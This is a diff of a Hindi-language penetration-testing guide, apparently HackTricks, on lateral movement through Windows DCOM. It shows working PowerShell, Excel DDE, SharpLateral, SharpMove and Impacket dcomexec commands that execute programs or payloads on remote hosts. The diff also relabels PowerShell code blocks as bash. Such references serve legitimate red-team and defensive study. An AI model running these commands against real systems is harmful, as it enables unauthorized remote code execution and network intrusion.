@@ -12,19 +12,19 @@ Get-CimInstance Win32_DCOMApplication
 ```
 COM ऑब्जेक्ट, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC स्नैप-इन ऑपरेशनों के स्क्रिप्टिंग की अनुमति देता है। विशेष रूप से, इस ऑब्जेक्ट में `Document.ActiveView` के तहत `ExecuteShellCommand` विधि शामिल है। इस विधि के बारे में अधिक जानकारी [यहां](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) मिल सकती है। इसे चलाते हुए देखें:
 
-यह सुविधा एक नेटवर्क पर DCOM एप्लिकेशन के माध्यम से कमांड निष्पादित करने की सुविधा प्रदान करती है। DCOM के साथ दूरस्थ रूप से एक व्यवस्थापक के रूप में बातचीत करने के लिए, PowerShell का उपयोग निम्नलिखित तरीके से किया जा सकता है:
-```powershell
+यह सुविधा DCOM एप्लिकेशन के माध्यम से नेटवर्क पर कमांड निष्पादित करने की सुविधा प्रदान करती है। एक व्यवस्थापक के रूप में दूरस्थ रूप से DCOM के साथ इंटरैक्ट करने के लिए, PowerShell का उपयोग निम्नलिखित तरीके से किया जा सकता है:
+```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
 यह कमांड DCOM एप्लिकेशन से कनेक्ट करता है और COM ऑब्जेक्ट का एक उदाहरण लौटाता है। ExecuteShellCommand विधि को फिर दूरस्थ होस्ट पर एक प्रक्रिया निष्पादित करने के लिए बुलाया जा सकता है। प्रक्रिया में निम्नलिखित चरण शामिल हैं:
 
 Check methods:
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
 RCE प्राप्त करें:
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
 
@@ -42,21 +42,26 @@ ls \\10.10.10.10\c$\Users
 
 ### ShellWindows
 
-`ShellWindows` के लिए, जो एक ProgID की कमी है, .NET विधियाँ `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके ऑब्जेक्ट इंस्टेंटिएशन को सुविधाजनक बनाती हैं। यह प्रक्रिया `ShellWindows` के लिए CLSID प्राप्त करने के लिए OleView .NET का उपयोग करती है। एक बार इंस्टेंटिएट होने के बाद, `WindowsShell.Item` विधि के माध्यम से इंटरैक्शन संभव है, जिससे `Document.Application.ShellExecute` जैसी विधियों का आह्वान होता है।
+`ShellWindows` के लिए, जो एक ProgID की कमी है, .NET विधियाँ `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके ऑब्जेक्ट इंस्टेंशिएट करने में सहायता करती हैं। यह प्रक्रिया `ShellWindows` के लिए CLSID प्राप्त करने के लिए OleView .NET का उपयोग करती है। एक बार इंस्टेंशिएट होने के बाद, `WindowsShell.Item` विधि के माध्यम से इंटरैक्शन संभव है, जिससे `Document.Application.ShellExecute` जैसी विधियों का आह्वान किया जा सकता है।
 
-ऑब्जेक्ट को इंस्टेंटिएट करने और दूरस्थ रूप से कमांड निष्पादित करने के लिए उदाहरण PowerShell कमांड प्रदान किए गए थे:
-```powershell
+ऑब्जेक्ट को इंस्टेंशिएट करने और दूरस्थ रूप से कमांड निष्पादित करने के लिए उदाहरण PowerShell कमांड प्रदान किए गए थे:
+```bash
+# Example
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+
+# Need to upload the file to execute
+$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
+$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
 ```
 ### Lateral Movement with Excel DCOM Objects
 
 Lateral movement को DCOM Excel objects का उपयोग करके प्राप्त किया जा सकता है। विस्तृत जानकारी के लिए, DCOM के माध्यम से lateral movement के लिए Excel DDE का उपयोग करने पर चर्चा पढ़ना उचित है [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)।
 
 Empire प्रोजेक्ट एक PowerShell स्क्रिप्ट प्रदान करता है, जो DCOM objects को हेरफेर करके Excel के लिए remote code execution (RCE) के उपयोग को प्रदर्शित करता है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) पर उपलब्ध स्क्रिप्ट से स्निप्पेट्स हैं, जो RCE के लिए Excel का दुरुपयोग करने के विभिन्न तरीकों को दर्शाते हैं:
-```powershell
+```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
 $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
@@ -78,22 +83,34 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Automation Tools for Lateral Movement
+### Lateral Movement के लिए ऑटोमेशन टूल्स
 
-इन तकनीकों को स्वचालित करने के लिए दो उपकरणों को उजागर किया गया है:
+इन तकनीकों को स्वचालित करने के लिए दो टूल्स को उजागर किया गया है:
 
 - **Invoke-DCOM.ps1**: एक PowerShell स्क्रिप्ट जो Empire प्रोजेक्ट द्वारा प्रदान की गई है, जो दूरस्थ मशीनों पर कोड निष्पादित करने के विभिन्न तरीकों को सरल बनाती है। यह स्क्रिप्ट Empire GitHub रिपॉजिटरी पर उपलब्ध है।
 
-- **SharpLateral**: एक उपकरण जो दूरस्थ रूप से कोड निष्पादित करने के लिए डिज़ाइन किया गया है, जिसे इस कमांड के साथ उपयोग किया जा सकता है:
+- **SharpLateral**: एक टूल जो दूरस्थ रूप से कोड निष्पादित करने के लिए डिज़ाइन किया गया है, जिसे निम्नलिखित कमांड के साथ उपयोग किया जा सकता है:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
+- [SharpMove](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
+```
 ## Automatic Tools
 
-- Powershell स्क्रिप्ट [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) अन्य मशीनों में कोड निष्पादित करने के लिए सभी टिप्पणी किए गए तरीकों को आसानी से लागू करने की अनुमति देती है।
+- The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) अन्य मशीनों में कोड निष्पादित करने के लिए सभी टिप्पणी किए गए तरीकों को आसानी से लागू करने की अनुमति देता है।
+- आप DCOM का उपयोग करके दूरस्थ सिस्टम पर कमांड निष्पादित करने के लिए Impacket का `dcomexec.py` उपयोग कर सकते हैं।
+```bash
+dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+```
 - आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+```
+- आप [**SharpMove**](https://github.com/0xthirteen/SharpMove) का भी उपयोग कर सकते हैं
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 ## संदर्भ
 
